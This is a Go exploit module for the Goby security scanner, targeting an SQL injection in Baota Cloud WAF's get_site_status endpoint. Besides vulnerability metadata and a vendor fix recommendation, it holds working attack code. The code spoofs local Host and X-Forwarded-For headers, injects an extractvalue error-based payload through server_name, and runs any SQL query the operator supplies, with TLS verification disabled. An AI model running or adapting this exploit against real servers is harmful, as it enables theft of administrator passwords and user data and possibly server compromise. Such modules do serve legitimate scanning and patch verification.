package exploits

import (
	"crypto/md5"
	"crypto/tls"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Baota Cloud WAF get_site_status path server_name parameter SQL injection vulnerability",
    "Description": "<p>Baota Cloud WAF is a free WAF firewall. It is the first WAF firewall to support ARM domestic systems. It has ultra-high degree of freedom in custom interception rules and can flexibly configure various restricted access, effectively preventing CC attacks, malicious collection, and anti-brushing. Common attacks such as interfaces and hacker penetration testing behaviors.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
    "Product": "BT-WAF",
    "Homepage": "https://www.bt.cn/new/btwaf.html",
    "DisclosureDate": "2024-02-17",
    "PostTime": "2024-02-19",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"?btwaf\"",
    "GobyQuery": "body=\"?btwaf\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.bt.cn/new/index.html\">https://www.bt.cn/new/index.html</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [
        "https://www.bt.cn/bbs/forum.php?mod=viewthread&tid=127877&highlight=waf"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "SELECT database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "堡塔云 WAF get_site_status 路径 server_name 参数 SQL 注入漏洞",
            "Product": "宝塔-WAF",
            "Description": "<p>堡塔云WAF是免费的WAF防火墙，首个支持ARM国产系统的WAF防火墙，有超高自由度的自定义拦截规则和可灵活配置各种限制访问，有效防CC攻击、防恶意采集、防刷接口等常见攻击和黑客渗透测试行为。<br></p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请更新到最新版本：<a href=\"https://www.bt.cn/new/index.html\">https://www.bt.cn/new/index.html</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Baota Cloud WAF get_site_status path server_name parameter SQL injection vulnerability",
            "Product": "BT-WAF",
            "Description": "<p>Baota Cloud WAF is a free WAF firewall. It is the first WAF firewall to support ARM domestic systems. It has ultra-high degree of freedom in custom interception rules and can flexibly configure various restricted access, effectively preventing CC attacks, malicious collection, and anti-brushing. Common attacks such as interfaces and hacker penetration testing behaviors.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.bt.cn/new/index.html\">https://www.bt.cn/new/index.html</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10923"
}`
	sendPayloadOXICUYHAISD := func(hostInfo *httpclient.FixUrl, sqlCommand string) (string, error) {
		conn, err := httpclient.GetTCPConn(hostInfo.HostInfo)
		if err != nil {
			return "", err
		}
		if hostInfo.Scheme() == "https" {
			conn = tls.Client(conn, &tls.Config{
				MinVersion:         tls.VersionTLS10,
				InsecureSkipVerify: true,
			})
		}
		responseString := ""
		defer conn.Close()
		messageData := []byte("GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,(" + url.QueryEscape(sqlCommand) + ")))-' HTTP/1.1\r\n" +
			"Host: 127.0.0.251\r\n" +
			"X-Forwarded-For: 127.0.0.1\r\n" +
			"Upgrade-Insecure-Requests: 1\r\n" +
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\n" +
			"\r\n" +
			"\r\n")
		_, err = conn.Write(messageData)
		buf := make([]byte, 1024)
		for {
			count, errs := conn.Read(buf)
			tmpMessageData := string(buf[0:count])
			responseString += tmpMessageData
			if errs != nil {
				break
			}
		}
		matches := regexp.MustCompile(`"msg":"([^"]+)"`).FindStringSubmatch(responseString)
		if len(matches) >= 2 {
			return matches[1], nil
		}
		return "", errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomString := goutils.RandomHexString(5)
			resp, _ := sendPayloadOXICUYHAISD(hostInfo, "select md5('"+randomString+"')")
			return strings.Contains(resp, fmt.Sprintf("%x", md5.Sum([]byte(randomString)))[:20])
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "sql" {
				if result, err := sendPayloadOXICUYHAISD(expResult.HostInfo, goutils.B2S(stepLogs.Params["sql"])); len(result) > 1 {
					expResult.Success = true
					expResult.Output = result
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				randomString := goutils.RandomHexString(5)
				if resp, err := sendPayloadOXICUYHAISD(expResult.HostInfo, "select md5('"+randomString+"')"); strings.Contains(resp, fmt.Sprintf("%x", md5.Sum([]byte(randomString)))[:20]) {
					expResult.Output = `GET ` + expResult.HostInfo.FixedHostInfo + `/get_site_status?server_name='-extractvalue(1,concat(0x5c,(select%20md5(637))))-' HTTP/2
Host: 127.0.0.251
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36`
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
